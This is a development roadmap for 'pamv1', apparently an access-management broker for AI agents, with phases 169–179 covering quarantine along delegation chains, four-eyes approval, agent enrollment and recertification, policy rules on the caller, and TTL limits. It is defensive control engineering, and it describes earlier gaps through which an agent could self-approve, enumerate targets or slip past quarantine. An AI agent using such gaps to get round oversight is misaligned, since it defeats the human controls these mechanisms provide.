- [x] **Refused like every other agent refusal**: `agent.posture_denied …
  reason:posture-check-failed` on the trail, and the same 401 a bad bearer gets,
  so the agent learns nothing from the reply about why it stopped working
- [x] **Additive wire change**: `posture.AttestSubject(ctx, kind, name)` sends
  `{"user": …, "kind": "user"|"agent"}`. `user` keeps its name, so a webhook
  written before agents were attested is unaffected; `kind` exists because a
  posture system that cannot tell a laptop from a workload tends to answer
  "healthy" for both
- [x] **Said plainly, in the package doc and the admin guide**: for a laptop an
  EDR system knows the device; for a workload the webhook answers about a NAME
  pamv1 verified cryptographically, **not** about the process holding the
  credential. Binding a credential to its process is workload attestation
  (SPIRE), which stays infra-bound. An agent posture answer means "the fleet
  manager believes this identity's workload is healthy", never "the caller IS
  that workload" — and the cost, one webhook call per brokered call, is stated
  where an operator decides
- [x] Tests, verified to FAIL with the gate neutralised:
  `api.TestAgentPostureIsEnforcedAndOptIn`,
  `api.TestAgentPostureRefusalIsAudited`,
  `api.TestAgentPostureIsNotAskedAboutAStoppedAgent`
- [x] **A CI-gate repair that had to ride along**: `staticcheck` 2026.2 on the
  runner began failing every PR on `internal/agentid/svid.go` — Go 1.26
  deprecated `ecdsa.PublicKey`'s `X`/`Y` fields, and the JWK parser filled them
  directly. Nothing to do with this phase, but nothing merges behind a red gate,
  so it is fixed here: `p256FromJWK` now parses the SEC1 uncompressed encoding
  through `ecdsa.ParseUncompressedPublicKey`. That is a small security
  improvement rather than a lint appeasement — assigning coordinates builds
  whatever it is handed, on-curve or not, while parsing VALIDATES the point. A
  trust-domain JWKS is operator-supplied configuration, so this was never a live
  hole; a verifier that refuses to build an invalid key is simply the right
  shape. Short coordinates (a stripped leading zero, a common encoder bug) are
  left-padded rather than refused; over-long ones are refused.
  `agentid.TestP256JWKRejectsAnOffCurvePoint` pins all three
- [x] One new env var; no schema change; no new route

## Phase 179 — Make the flaky test say why ✅

**Closes:** §3d's first half — not the flake itself, which is still not
understood, but the reason it could not be understood.

**The dead end.** A CI run failed with `server error: pamv1: upstream connection
failed`. That is the message the proxy sends a **client**, and it is vague on
purpose: a client is not owed the upstream's error. The real cause was in two
places the test never looked — the server log, and the audit trail as
`db.session.error … error:<real error>` — so a failure that had already been
diagnosed by the code under test arrived as a mystery. A test that cannot say
why it failed teaches a team to rerun rather than read, which is how a real
defect eventually gets rerun past.

- [x] **`auditOnFailure(t, st)`** registers a cleanup that prints the last fifty
  audit rows when a test fails, and nothing at all when it passes. Wired into
  every database-proxy test that opens a session (six in `dbproxy_test.go`, three
  in `dbzsp_test.go`). Proven by pointing a ZSP test at a dead upstream: the run
  now reports `error:provisioner dial: dial tcp 127.0.0.1:1: connect: connection
  refused` beside the vague wire message
- [x] **The ZSP tests stop being more impatient than production.** They set
  `DialTimeout: 5s` where `NewDB` defaults to 10s — an arbitrary tightening, and
  one plausible reading of a CI failure on a loaded runner. The override is gone.
  Labelled in the code as a candidate, not a fix: nothing has been reproduced,
  and pretending otherwise would be worse than the flake
- [x] **Not done, deliberately**: no timing code was touched. Six full `-race`
  passes of the proxy package under saturated CPU with `GOMAXPROCS=1`, and forty
  runs of the ZSP tests alone, all pass — so there is no evidence to fix against
  yet, and §3d stays open with the cause marked unproven
- [x] Test-only change: no production code, no schema, no route, no env var

## Phase 178 — v0.49.0 ✅

Releases phases 173–177: the batch's identity work (a policy principal side, an
inventory of attested identities, recertification for non-human ones) and the
sweep that audited those very phases and fixed what it found. **Schema change** —
the migration high-water mark moves `0045` -> `0046` (three additive columns on
`agent_identities`, applied on startup, no backfill). Two new env vars, both
default-off, and **three upgrade notes** — more than any release so far, because
two of the five phases change what an operator sees rather than only what pamv1
enforces.

- [ ] **v0.49.0** through the test-gated pipeline, rehearsed on `main` first.
  Published as `ghcr.io/morandeirachema/pamv1:0.49.0` (also `latest`), digest
  recorded here once the publish workflow runs, verified **public** by anonymous
  pull, with the `pam-agent` binaries attached as since v0.40.0
- [x] All five pins via the sweep; Helm chart `version` 0.39.0 -> **0.40.0**
- [x] Both READMEs restated; `docs/README.md`, `docs/NIS2-COMPLIANCE.md` (whose
  control-mapping note absorbs 173–177: two new action families counted by the
  prefix the access-control control already uses, and one phase that changes what
  a campaign COVERS rather than what it records) and ROADMAP.md's top-banner
  phase count
- [x] `CHANGELOG.md` gains the release entry, and it is the first whose **Fixed**
  section repairs a defect introduced earlier in the same entry — `owner_known`
  shipped in 175 and was corrected in 176, both inside this release. Said plainly
  rather than quietly merged into the feature description
- [x] The three upgrade notes are written where an operator meets them: campaign
  queues grow (175), enrol SPIFFE identities before requiring enrollment (174),
  and check the owner flags before requiring a known owner (176)
- [x] The tag is pushed only **after** the release PR is confirmed merged
- [x] Full CI-gate sweep re-verified clean on `main` before tagging: `gofmt`,
  `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race ./...`,
  `go run ./cmd/archgen`

## Phase 177 — The store surface nothing called ✅

**Closes:** §3c, the cleanup the previous sweep recorded — by deciding each item
rather than deleting the lot, because "no caller" turned out to mean three
different things.

- [x] **Two were capability gaps wearing dead code's clothes.**
  `UpdateVendorEmail` has existed since Phase 116 and was wired to nothing, so a
  vendor's contact address — where a magic-link approval invite is sent — could
  be set at creation and never corrected: a typo meant every invite went
  nowhere. `PUT /api/vendors/{id}` now accepts `email`, as a **pointer**, so "not
  supplied" and "cleared" stay distinguishable and an org-only edit cannot
  silently wipe the address; the value is validated (`net/mail.ParseAddress`,
  plus an equality check that rejects the `Name <addr>` form) and audited, since
  an invite sent to the wrong place is exactly what an investigation
  reconstructs. And `CountMFARecoveryCodes` could answer "how many codes have I
  left" since Phase 3b with nobody asking — `GET /api/mfa` now reports
  `recovery_codes_remaining`
- [x] **The count fails visibly, not quietly.** An unavailable count reports
  `-1` and the console says "(count unavailable)", because rendering 0 would send
  somebody to regenerate codes they still hold. None left is red, one or two
  amber: recovery codes are single-use and only regenerated deliberately, so the
  moment to notice is the one right after spending one
- [x] **One was surface that read like a control.** `SetVendorDisabled` is
  deleted (store surface 213 → **212**): it offered a second, weaker way to
  half-stop a vendor, while the control that actually does it is
  `OffboardVendor` — disable and revoke every grant, atomically. A spare
  half-control is what somebody reaches for by mistake
- [x] **Three were kept, deliberately.** `GetApprovalInvite`, `GetCheckout` and
  `GetVendorByUsername` are read primitives the store contract suite uses to
  verify what a production path wrote — and `GetCheckout` reads a RETURNED
  lease, which `GetActiveCheckout` structurally cannot. A test-only read is a
  legitimate use; deleting them to make a scan look tidier would weaken the
  suite. Recorded here so the next sweep does not re-find them
- [x] Tests: `api.TestMFAStatusReportsRecoveryCodesLeft` (the count appears,
  changes with the codes, and the status never echoes the codes themselves) and
  `api.TestVendorEmailIsCorrectable` (malformed refused, correction visible, and
  an org-only edit leaves the address alone)
- [x] No schema change (high-water stays `0046`), no new env var, no new route

## Phase 176 — A gap sweep over the batch's own code ✅

A read-only pass over what phases 159–175 had just shipped, run the way the
earlier sweeps were: mechanical scans first — config fields with no consumer,
store methods with no caller, documented audit actions with no emitter,
fail-open error branches in every gate-shaped function, bool flags honoured on
read but never set — then a close read of the newest code. **One live defect and
four weaknesses, all of them in this batch's own work.**

- [x] **The live one: a flag that claimed a reachability the control does not
  have.** Phase 175's `owner_known` lowercased both sides of the comparison,
  while every owner lookup in pamv1 is a literal match (`WHERE owner = $1`,
  `WHERE username = $1`). An agent owned by `Carol` while the user is `carol` was
  reported as fine and is unreachable: deleting `carol` suspends nothing. That is
  the same class as a dead field that reads like a control — a report that is
  wrong in the reassuring direction. Now exact-case, and the asymmetry is written
  down: the four-eyes comparison stays case-INSENSITIVE on purpose, because
  matching more broadly there **refuses** more, which is the safe direction
- [x] **Four-eyes could not be verified, and did not say so.** The gate refuses
  `owner == approver`, so an owner nobody holds — a typo, or a team address —
  can never match, and the real owner may approve their own agent's call. pamv1
  now records `broker.approval.four_eyes_unverified` naming the owner, and
  **`PAM_BROKER_REQUIRE_KNOWN_OWNER`** (default off) refuses the decision
  instead. Off by default because a team-owned agent is a legitimate
  arrangement; the trail is honest either way
- [x] **The inventory missed the delegation chain.** Phase 174 recorded only the
  presenting identity, though the controls that read the inventory read every
  actor in the chain — quarantine walks it (169), four-eyes resolves an owner for
  each link (170). A delegating root that never called pamv1 directly had no row,
  so an operator could not enrol it from the list. `seeSVID` now records every
  verified chain member, and an indirect sighting is marked `via:<presenter>` so
  the trail says how pamv1 learned about it
- [x] **And it wrote on every call.** The last-seen stamp was rewritten per
  authentication — sixty writes a minute for one agent at the default rate limit,
  forever. A per-replica in-process damper (`sightingInterval`, one minute) makes
  it one write per identity per minute; a **first** sighting is never damped
  because that one is the signal, and a failed write forgets its entry so the
  next call retries rather than waiting out an interval it never recorded
- [x] **Micro, but on the hot path**: `policy.Rule.matchesCaller` built the
  caller's identity list for every rule even when `not_agents` was empty — the
  ordinary case, on every tool call. Both lists short-circuit now
- [x] **Recorded, not fixed**: six store methods have no production caller
  (`CountMFARecoveryCodes`, `GetApprovalInvite`, `GetCheckout`,
  `GetVendorByUsername`, `SetVendorDisabled`, `UpdateVendorEmail`). None is a
  defect — but `SetVendorDisabled` *reads* like a control when the real one is
  `OffboardVendor`, and `CountMFARecoveryCodes` is a signal a user could use
  ("how many codes are left"). Tracked in [What is left](#what-is-left-) §3c
- [x] **Also checked and clean**: no config field is parsed and unread
  (`BreakGlassShares` is read by `-split-key` directly); every documented audit
  action is emitted, including the fifteen built by concatenation that a literal
  scan flags as missing; no gate-shaped function has a fail-open error branch;
  and no store bool is honoured on read while nothing can set it — the Phase 159
  defect class has no instances left
- [x] Tests, each verified to FAIL against the code before it:
  `api.TestOwnerKnownMatchesTheControlItReportsOn` (which proves the claim by
  deleting the user and watching which agent is suspended),
  `api.TestFourEyesRecordsWhatItCouldNotVerify`,
  `api.TestDelegationChainIsInventoried`
- [x] No schema change (high-water stays `0046`); one new env var; no new route

## Phase 175 — The identities nobody was reviewing ✅

**Closes:** the agent-broker research pass's finding 7 — agent identities are
never recertified, and their owner is free text nothing checks.

**The gap.** A certification campaign — the periodic "recertify or revoke" review
SOX / ISO 27001 / NIS2 expect — snapshotted `target_grant` and `safe_member` and
nothing else. AI-agent identities hold brokered access to the same estate and
were reviewed by **nobody**. Worse, the one place an agent *did* surface was a
target grant naming it, which is stored with `SubjectType "user"`: reviewed, when
at all, as though it were a person.

- [x] **Agents are campaign items of their own** — `agent_key` and
  `agent_identity`, both `SubjectType "agent"`, carrying what makes the question
  answerable: the owner, the lifecycle state (active/suspended/expired, or
  enrolled/seen) and the dormancy signal (*last used* for a key, *last seen* for
  an SVID). An agent nobody has called in four months, owned by somebody who
  left, is exactly what the review exists to surface
- [x] **Safe-scoped campaigns skip them.** An agent is not a member of a safe,
  and padding a safe review with unrelated rows is the "list you were not asked
  to review" failure `snapshotAccess`'s own header warns about
- [x] **Revoking stops, it does not delete** (following Phase 159's stance): a
  static key is suspended, an attested identity is quarantined — both reversible,
  both audited `reason:certification-revoked`, both keeping the row an
  investigation needs. An identity already stopped is success rather than an
  error, exactly as a grant already gone is on the human path, and an existing
  quarantine entry is never overwritten by this one
- [x] **The owner-typo half of the same finding.** An owner is free text on both
  identity kinds and the offboarding cascade matches it as a username STRING, so
  `caro1` makes an agent no cascade can ever reach while the row still reads as
  accountable. pamv1 does **not** refuse an unrecognised owner — a team address or
  a service account is a legitimate answer to "who answers for this" — it
  **reports** one: `owner_known` on both agent listings, a red owner with a `?` on
  console menus 26 and F8, and a WARNING inside the campaign item, where a
  reviewer is already asking that exact question. One roster read per listing,
  degrading to "no finding" if it fails, so a database hiccup cannot turn an
  inventory screen into a wall of warnings
- [x] **A console defect found on the way**: the campaign screen rendered the item
  kind with a non-truncating `pad(…, 12)`, and `agent_identity` is fourteen
  characters — the row would have widened the moment the first agent item
  appeared. Now `cell(…, 14)`; the revoke wording and the empty-state text, both
  of which said "grant", now say what actually happens to each kind
- [x] **Tests, both verified to FAIL against the pre-fix snapshot**:
  `api.TestCampaignCertifiesAgentIdentities` (both kinds appear, reviewed as
  agents, with dormancy; revoke suspends the key, quarantines the subject, deletes
  neither, audits both) and `api.TestCampaignFlagsAnOwnerNobodyCanOffboard`
- [x] No schema change (high-water stays `0046`), no new env var, no new route

## Phase 174 — The inventory an attested identity never had ✅

**Closes:** the agent-broker research pass's finding 2 (SVID agents have no
enrollment) and the inventory half of E.

**The gap.** A static agent key is knowable by definition — pamv1 minted it. An
SVID is the opposite: **any workload the trust domain vouches for may
authenticate**, and pamv1 knew only about the ones an admin had happened to type
into Phase 170's owner registry. No list to review, no first-seen, no last-seen,
and no way to say "only identities somebody has claimed may call". That is
awkward on its own and worse in context: every containment control built for this
identity kind — quarantine (159, 169), four-eyes (170), the offboarding cascade
(170) — keys on a **subject a responder must be able to name**, and nothing told
them which subjects existed.

- [x] **The inventory builds itself.** `agentAuth` records every attested
  authentication (`noteSVID` → the new `SeeAgentIdentity` upsert): a first
  sighting inserts an **unenrolled, unowned** row with both stamps and is audited
  once as `agent.identity_first_seen`; every call after moves `last_seen` only.
  Auditing the first sighting rather than each call is the difference between a
  signal an operator reads and a flood they filter
- [x] **Recording is best-effort, refusing is fail-closed.** A sighting is
  bookkeeping, so a store failure must never turn an authenticated call into a
  refused one — the stance `TouchAgentKey` already takes for static keys. The
  enrollment *check* is the opposite: if the deployment has said only enrolled
  identities may call, an unreadable registry cannot be read as "enrolled"
- [x] **`PAM_BROKER_REQUIRE_ENROLLED_SVID`** (default off) makes the claim
  mandatory: an unenrolled identity is refused through the same `authFailed` path
  a bad bearer takes, so it learns nothing from the reply, and audited
  `agent.not_enrolled`. **The sighting is still recorded on refusal** — an
  operator enrols FROM the inventory, so an identity that knocked and was turned
  away has to appear in the list they are looking at
- [x] **Registering a discovered identity ADOPTS it.** `POST /v1/agents/identities`
  naming a SPIFFE ID that already has an unenrolled row sets its owner and note
  and marks it enrolled (`EnrollAgentIdentity`), keeping `first_seen`; only a
  second registration of an already-enrolled row is a conflict. Without this the
  inventory would tell an operator about an identity they then could not claim.
  Naming an owner is what enrolling *means*, so the handover route enrols too
- [x] **A row is not an attribution.** An unowned row is exactly as unattributed
  as no row at all: `accountableOwners` refuses the approval rather than
  comparing an approver against an empty string — which would have been a
  four-eyes gate satisfied by `""`, a regression hidden inside a feature
- [x] **Static keys are untouched** by all of it: pamv1 issued them, so there is
  nothing to enrol and requiring enrollment must not lock the other identity kind
  out. Pinned in the same test as the refusal
- [x] **Console parity**: menu 26 → F8 now shows **state** (enrolled / seen) and
  **last seen**, `5=Set owner (enrols)`, and says plainly what a seen row means
  for approvals; the `console_check.js` fixture drives a discovered row with a
  null `last_seen`, the shape a row registered ahead of its first call has
- [x] **Tests, each verified to FAIL against the pre-fix code**:
  `api.TestSVIDInventoryBuildsItself`,
  `api.TestRequireEnrolledSVIDRefusesTheUnclaimed`,
  `api.TestDiscoveredIdentityIsUnattributedForFourEyes`, plus the store contract
  suite's enrollment block (first sighting, repeat sighting, adoption, and that a
  later sighting never downgrades an enrolled row)
- [x] **Honest limit, unchanged**: enrolling is **not attestation**. It admits no
  workload — the trust domain already did — and proves nothing about the process
  holding the SVID. SPIRE workload attestation stays infra-bound
- [x] Migration `0046` (three additive columns; `enrolled` defaults TRUE so every
  operator-created row stays truthful); store surface 211 → **213**; one new env
  var; no new route

## Phase 173 — Policy with a principal side, and an identity it can trust ✅

**Closes:** the agent-broker research pass's findings B (policy has no principal
side — three vendors model it and pamv1 did not) and 3 (policy is identity-blind
— the verified identity was in scope one line above `Evaluate` and never passed).
They are one defect from two directions: the engine's whole input was
`(tool, args)`.

**What that cost.** A rule could say *what*, never *who*: one `allow` for
`reveal_credential` enabled that tool for **every** agent the deployment
authenticates. And because a condition could only read `args`, any rule keyed on
"which agent is this" was keyed on a string the agent chose to send — a control
whose subject is picked by the party it constrains. The package's own sudoers
analogy was incomplete the whole time: sudoers has a user column.

- [x] **`Evaluate(caller policy.Caller, tool, args)`.** `Caller{Agent, SPIFFEID,
  OnBehalfOf, Chain}` is projected from the verified `*agentid.Identity` by
  `broker.callerOf` — a projection rather than a shared type, so `internal/policy`
  still imports nothing from the identity layer and keeps deciding over facts
  rather than over an authentication mechanism
- [x] **`agents:` and `not_agents:` on a rule.** Empty matches every agent, so
  every policy written before this phase behaves exactly as it did. `agents:`
  matches the **presenter** only — a call delegated from a listed agent arrives
  under the delegate's own identity and needs its own rule — while `not_agents:`
  matches **any** identity the call is attributable to (presenter, delegation
  chain, accountable party), so an exclusion cannot be escaped by delegating one
  hop, the gap Phase 169 closed for quarantine. The asymmetry is deliberate:
  both directions narrow what a rule admits, which is where a mistake should fall
- [x] **A reserved `caller.*` condition namespace**: `caller.agent`,
  `caller.spiffe_id`, `caller.on_behalf_of`, `caller.delegation_depth` and
  `caller.identity_kind`. Depth counts **hops**, so 0 is an undelegated call for
  both identity kinds and `{ gte: 1 }` reads as "arrived through a delegated
  token"; an empty value reads as absent, so `caller.spiffe_id: { present: false }`
  is how a rule says "a static agent key"
- [x] **It cannot be forged by the party it constrains.** A `caller.` key is a
  different lookup that never touches the argument map, so an argument named
  `caller.agent` cannot satisfy `caller.agent` — and over the wire the tool's
  argument schema (Phase 163) refuses the undeclared argument before policy even
  runs. Two independent gates, pinned by one test each
- [x] **An unknown `caller.*` attribute is a load error**, not a condition that
  silently never matches — Phase 171's lesson applied to the new namespace — and
  so is an empty entry in either principal list
- [x] **Tests, each verified to FAIL against the pre-fix engine** (where the
  second agent executed the same call): `policy.TestRulePrincipalSide`,
  `policy.TestNotAgentsExcludesTheWholeChain`,
  `policy.TestCallerConditions`,
  `policy.TestCallerAttributesCannotBeForgedByArguments`,
  `policy.TestUnknownCallerAttributeIsRefusedAtLoad`, plus
  `api.TestBrokerPolicyHasAPrincipalSide` and
  `api.TestCallerConditionCannotBeForgedOverTheWire` end to end over HTTP
- [x] **Honest remainder**: a rule cannot match on the *registry* owner Phase 170
  records for a SPIFFE identity — `caller.on_behalf_of` is the accountable party
  as the identity carries it. Resolving the registry inside the engine would make
  it read the store, which it deliberately does not do
- [x] No schema change (high-water stays `0045`), no new env var, no route
  change; the shipped `deploy/broker-policy.example.yaml` gains both new shapes,
  and the admin guide, code guide and threat model document them

## Phase 172 — v0.48.0 ✅

Releases phases 169, 170 and 171 — the three live defects the agent-broker
follow-on research found at HEAD. A minor, and the first release in a while
whose CHANGELOG leads with **Fixed**: two of the three made a control that reads
as covering every agent silently inert for the SPIFFE-attested identity kind,
which the roadmap calls the intended production posture. **Schema change** — the
migration high-water mark moves `0044` -> `0045` (a new table, applied on
startup, no backfill). Four new routes, no new env var, **two upgrade notes**.

- [x] **v0.48.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-18 as `ghcr.io/morandeirachema/pamv1:0.48.0` (also
  `latest`), digest
  `sha256:71f2ec734b1b4c4391cbe4a1f77e04c0bdc01d568f2e0184734488631c44852c`,
  **public** (anonymous pull 200 on both tags via the GHCR token-exchange flow,
  both resolving to the same digest), with the `pam-agent` binaries (amd64 +
  arm64), the SPDX SBOM and `SHA256SUMS` attached. The release workflow's own
  test job gated the tag and passed first time, as it did for v0.47.0
- [x] All five pins via the sweep; Helm chart `version` 0.38.0 -> **0.39.0**
- [x] Both READMEs restated; `docs/README.md`, `docs/NIS2-COMPLIANCE.md` (whose
  control-mapping note absorbs 169–171: a new `subject:` detail on an existing
  action, four new names inside the `agent.*` family already counted by prefix,
  and no new action at all for 171) and ROADMAP.md's top-banner phase count
- [x] `CHANGELOG.md` gains the release entry, with both **upgrade notes** stated
  where an operator will hit them: a SPIFFE deployment must register agent owners
  before parked calls can be approved, and a policy carrying `ttl_seconds` on an
  allow/deny rule now fails to load
- [x] The tag is pushed only **after** the release PR is confirmed merged
- [x] Full CI-gate sweep re-verified clean on `main` before tagging: `gofmt`,
  `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race ./...`,
  `go run ./cmd/archgen` (schema + route drift, both of which this release has)

## Phase 171 — The dead controls: a TTL that binds, a scope that is honest ✅

**Closes:** the agent-broker research pass's finding A — `ttl_seconds` and
`scope` were advertised controls that constrained nothing, and the **shipped
example policy marketed one of them**.

**The defect.** `policy.Rule.TTLSeconds` was parsed into `Decision.TTL` and read
by no non-test caller anywhere in the tree. A rule saying `ttl_seconds: 60` got
`PAM_BROKER_TOKEN_TTL_MIN` — fifteen minutes by default — and
`deploy/broker-policy.example.yaml` presented exactly that setting as "a scoped,
short-lived grant". That is the failure class Phase 159 named: **a dead field
that reads like a control is worse than an absent one**, and worse still when the
example teaches operators to rely on it.

- [x] **`ttl_seconds` binds.** `Broker.effectiveTTL` narrows the deployment's
  window with the matched rule's value; `park` computes **one** deadline and uses
  it for both the parked call and its single-use resume token, so the reported
  window and the enforced one cannot drift apart; `SweepExpiredParked` evicts per
  call rather than against one global TTL
- [x] **Narrow only, never extend.** A policy file is edited far more often, and
  by more people, than a deployment's configuration. If a line of YAML could
  out-rank `PAM_BROKER_TOKEN_TTL_MIN`, the deployment-wide bound would be
  advisory — so a rule may shorten the window and nothing more
- [x] **Refused where it would mean nothing.** On an `allow` rule the call
  executes and returns in the same request; on a `deny` there is nothing to bound.
  `ttl_seconds` on either is now a **policy load error** (as is a negative value),
  the same fail-loud stance the engine already took for an approval rule with no
  approvers. **Upgrade note**: a policy carrying that setting today fails to load
  — it never did anything, and the error says where it belongs
- [x] **`scope` is described, not promoted.** It renders a template into the
  audit record and cannot narrow what a call does: the arguments are fixed before
  policy runs and the broker executes exactly those. What it *does* do is assert
  presence — a template naming `{target}` fails to render for a call without that
  argument, and a render failure is a deny. So: a label with a fail-closed
  required-argument check. Enforcing it into more would be theatre; saying so
  plainly is the honest half of the phase, and it is said in the code, the
  example policy, the admin guide and the threat model
- [x] **Visible before it bites.** `Outcome.ExpiresAt` (`expires_at`) tells the
  agent when its parked call lapses, `PendingApproval.ExpiresAt` tells the
  approver, and console menu 20 gains a **DECIDE BY** column. An agent told only
  "pending" cannot otherwise tell a decision worth waiting for from one that can
  no longer happen
- [x] **A console defect found while adding that column**: the approvals row used
  `pad()` — which does not truncate — on four user-controlled cells, so one long
  agent name or argument blob pushed the later columns off the terminal. Now
  `cell()`, with arguments rendered as `k=v` pairs instead of a JSON blob, and the
  screen joins `console_check.js`'s row-width harness for the first time
- [x] **Tests, the first verified to FAIL against the pre-fix code:**
  `broker.TestRuleTTLBoundsTheApprovalWindow` (a 60-second rule under a 30-minute
  deployment TTL — reported deadline, approver queue and sweep all follow the
  rule), `broker.TestRuleTTLCannotExceedTheDeploymentTTL`,
  `broker.TestNoRuleTTLKeepsTheDeploymentWindow`, and
  `policy.TestTTLIsRefusedWhereItBoundsNothing`
- [x] No schema change (high-water stays `0045`), no new env var, no route change

## Phase 170 — An owner for the identity pamv1 never issued ✅

**Closes:** the agent-broker research pass's first and sharpest defect —
**four-eyes self-approval prevention was inert on the SPIFFE path**.

**The defect.** `decideBrokerApproval` refuses the human who owns an agent from
approving that agent's own parked call, by comparing the call's
`Identity.OnBehalfOf` against the approver's username. For an SVID-authenticated
agent that field is a SPIFFE ID, which can never equal a person's name — so the
comparison was always false and the gate never fired. The human operating an
agent could approve its privileged calls single-handed, in the deployment
posture the roadmap calls the intended production one. It is the Phase 159
defect's shape for the third time in this batch: a control written against the
identity kind pamv1 issues, silently inert for the kind it merely verifies.
Nothing in the tree mapped a SPIFFE ID to a person, so the comparison had
nothing to be right about.

- [x] **`agent_identities`** (migration `0045`, high-water `0044` → **`0045`**):
  `spiffe_id` UNIQUE → `owner`, plus a note, who registered it and when. UNIQUE
  because one identity has exactly one accountable owner; a second row would make
  "who is accountable" ambiguous at the precise moment it must not be. An owner
  index serves the offboarding query. `BrokerStore` +6 methods (store surface
  205 → **211**), both backends plus the shared contract suite
- [x] **It is an owner registry, not enrollment and not attestation.** Recording
  an owner admits no workload — the trust domain already decided who may
  authenticate — and proves nothing about one; SPIRE workload attestation stays
  infra-bound. It records who pamv1 holds responsible, which is exactly what the
  two broken controls were asking for. Said plainly in the code, the threat model
  and the admin guide, so nobody reads it as a stronger claim than it is
- [x] **Four routes** (`CapManageUsers`, like the rest of the agent surface):
  `POST`/`GET /v1/agents/identities`, `POST /v1/agents/identities/{id}/owner`
  (handover keeps the row, so first-registered-by/when survives the change), and
  `DELETE /v1/agents/identities/{id}`
- [x] **The gate resolves the WHOLE delegation chain**, not just the accountable
  party at its end — `broker.ApprovalOwner` became `broker.ApprovalIdentity`,
  which also carries `ActorChain`. A call made by a sub-agent was requested,
  transitively, by whoever owns the agents it acts for, so an approver who owns
  any link is on the requesting side of four-eyes. Same reasoning as Phase 169's
  chain-following quarantine: an identity's delegates are its reach
- [x] **Fails closed twice over.** An unattributed identity refuses the decision
  (403, `reason:agent-has-no-owner subject:<spiffe-id>`) and an unreadable
  registry refuses it too (503, `reason:owner-lookup-failed`). In both cases the
  call **stays parked**, so recording an owner unblocks the decision rather than
  making the agent ask again
- [x] **The offboarding cascade gained its other half.** Deleting a human
  suspends the agent keys they owned (Phase 159) and now quarantines the SPIFFE
  identities they owned — the only stop that identity kind has. An
  already-quarantined subject is left alone, so a second cascade cannot overwrite
  who stopped it and why; failures are audited (`agent.quarantine_failed`), never
  reported to the caller, exactly as its key-side sibling does
- [x] **Console parity**: menu 26 gains **F8** — `PAMAGTOWN` (the registry, with
  `4=Remove`/`5=Change owner`), `PAMADDOWN` and `PAMCHGOWN` — plus fixtures in
  `console_check.js` for all three, driven with a full-length SPIFFE ID beside a
  full-length owner, the pair that would push a column off a 5250 screen
- [x] **Upgrade note, operator-visible**: a SPIFFE deployment must register
  owners before parked calls can be approved. That is the fail-closed consequence
  of the gate finally working, not a side effect to route around
- [x] **Tests, verified to FAIL against the pre-fix gate** (where the
  self-approval executed): `api.TestFourEyesHoldsOnTheSPIFFEPath` (the approver
  owns the chain's root, not the calling agent; refused, call still parked; after
  a handover the same approver may decide),
  `api.TestApprovalRefusedWhenSPIFFEAgentHasNoOwner` (refused, audited, then
  unblocked by registering owners), plus
  `api.TestOffboardingQuarantinesOwnedSPIFFEIdentities` and
  `api.TestAgentIdentityRegistryValidation` (only a SPIFFE ID may be registered,
  one owner per identity, every route needs `manage_users`)
- [x] New audit actions in the low-level doc §5; no new env var; four new routes;
  one new migration

## Phase 169 — Containment that follows the chain, inventory that respects a grant ✅

**Closes:** the two live defects in the agent-broker follow-on research pass —
quarantine that stopped at the presenter, and a `list_targets` that answered for
the whole estate. Both were found by re-reading the tree at HEAD *after* phases
159–167 shipped, so neither is a regression: they are what those phases did not
reach.

**Why they are one phase.** Both are about the delegated, SPIFFE-attested path —
the posture the roadmap calls the intended production one — and both have the
same shape as the Phase 159 defect they follow: a control that reads as covering
every agent, checked against the one field the least-trusted identity kind does
not use.

- [x] **Quarantine follows the delegation chain.** `IsAgentQuarantined` was asked
  about `Identity.AgentName` only. A delegated JWT-SVID (Phase 57 token exchange)
  presents the *sub-agent's* subject and names its delegator solely in the RFC
  8693 `act` chain — so quarantining a compromised root left every token it had
  already minted working until that token's TTL expired. The responder pressed
  the stop button and watched the compromise continue. The check now walks the
  presenter plus every `ActorChain` element (`quarantineSubjects` /
  `quarantinedSubject`), at **both** moments an agent identity is consulted:
  ingress (`agentAuth`) and approval-time revalidation (`revalidateAgent`) — the
  second matters most, since a parked call is precisely what a responder is
  racing. Deduped, so the ordinary undelegated case is still a single lookup, and
  still fail-closed on a store error
- [x] **A static key's owner is deliberately NOT in that set.** For that identity
  kind `OnBehalfOf` holds the accountable HUMAN's username, and quarantine is an
  inventory of agent identities, not of people. Stopping every agent one human
  owns is *offboarding* — a different action, already shipped in Phase 159, with
  its own `reason:owner-offboarded` trail. An SVID's accountable party is the
  outermost chain element and so is covered anyway
- [x] **The refusal names the link that stopped the call.** `agent.quarantine_refused`
  gains a `subject:` field, written only when the quarantined identity is not the
  presenter. Without it the trail records the sub-agent that happened to make the
  call, leaving the responder to guess why an agent they never quarantined went
  quiet
- [x] **`list_targets` no longer hands over the estate.** Its principal parameter
  was literally `_`: an agent with zero grants received every target's name, host,
  OS and protocol, and the unfiltered `list_credentials` added every account name
  on them. No secret was ever read — `ListCredentialsMeta` cannot return one — but
  that is the reconnaissance step of an attack path given free to the
  least-trusted actor in the system, and it was the only place in
  `broker_tools.go` that skipped the grant check its siblings enforce. Both tools
  now answer through `agentCanSeeTarget`/`agentVisibleTargets`
- [x] **One definition of the check, not a second one.** `authorizeAgentTarget`
  and `authorizeAgentCredential` were refactored onto the same helper, so the
  tools that act on a target and the tools that merely list one cannot drift.
  Ungated targets (no grants, no safe) stay visible to everyone, exactly as on
  every other pamv1 path — this narrows an agent's view, it does not invent a
  second authorization model. Naming an ungranted target explicitly is **refused**
  (`agent not authorized for target`), not answered with an empty list: "you may
  not" and "there is nothing" are different facts, and an operator debugging a
  policy needs them apart
- [x] **Honest cost:** two store reads per target on an unfiltered listing,
  because grants are stored target-side and pamv1 has no subject-indexed grant
  query (the research's finding E — "what can this agent reach?" is unanswerable
  in one query — is still open). A cache would be the alternative, and a cache
  that can disagree with the gate is worse than the reads
- [x] **Behaviour change worth an operator's attention**: an agent whose estate is
  gated by grants now sees less than it did through both inventory tools
- [x] **Tests, each verified to FAIL against the pre-fix code:**
  `api.TestAgentQuarantineFollowsDelegationChain` (a real signed SVID whose `act`
  claim names a quarantined root is refused although its own subject is clean,
  the trail names the root, and releasing the root restores it),
  `api.TestRevalidateAgentQuarantineFollowsTheChain` (the parked-call half,
  in-package because no HTTP request reaches it without a SPIFFE deployment), and
  `api.TestBrokerInventoryToolsScopedToGrants` (both listings narrowed, the named
  ungranted target refused)
- [x] No schema change (migration high-water stays `0044`), no new env var, no
  route change. Docs updated in the same change: the threat model gains a "What
  an agent is allowed to KNOW" section and a corrected delegation-containment
